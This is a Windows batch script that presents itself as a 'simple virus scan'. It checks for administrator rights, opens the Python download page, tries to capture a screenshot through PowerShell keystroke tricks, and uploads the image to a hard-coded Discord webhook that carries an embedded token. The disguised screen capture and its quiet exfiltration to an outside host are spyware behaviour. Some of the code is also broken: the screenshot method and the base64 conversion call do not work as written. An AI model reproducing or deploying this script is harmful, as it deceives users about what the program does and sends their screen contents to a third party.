@echo off
echo simple virus scan
echo running
:: Check if the script is running as administrator
setlocal
for /F "tokens=4" %%i in ('whoami /groups ^| find "S-1-5-32-544"') do (
    set isAdmin=%%i
)
if "%isAdmin%"=="BUILTIN\\Administrators" (
    echo Running as administrator.
    :: Open Chrome to the Python download page
    start chrome https://www.python.org/downloads/release/python-3.13.1/
) else (
    echo Please run this script as an administrator.
    pause
)

:: Take a screenshot
powershell.exe -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('^s'); Start-Sleep -Seconds 1; $file = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'screenshot.png'); [System.Windows.Forms.SendKeys]::SendWait('{ENTER}'); Start-Sleep -Seconds 2; move 'C:\Windows\System32\screenshot.png' $file; exit"
echo Screenshot saved to %TEMP%\screenshot.png

:: Send the screenshot to Discord
powershell.exe -Command "& { $url = 'https://discord.com/api/webhooks/1318752969470251109/36PzXZklEDxs_GawBzhrbZeqyFZlD3lOANsVR7pCIeInR5o1aOw95GBLh251tk-RsKxJ'; $filename = '%TEMP%\screenshot.png'; $base64Image = [System.IO.File]::ReadAllBytes($filename) | Convert-ToBase64String; Invoke-RestMethod -Uri $url -Method Post -Body '{""content"": """", ""file"": ""@'"$base64Image"'""}"' -ContentType 'application/json' }"
echo Screenshot sent.
echo idk i just wanted to make sure it worked anyways byebye

pause
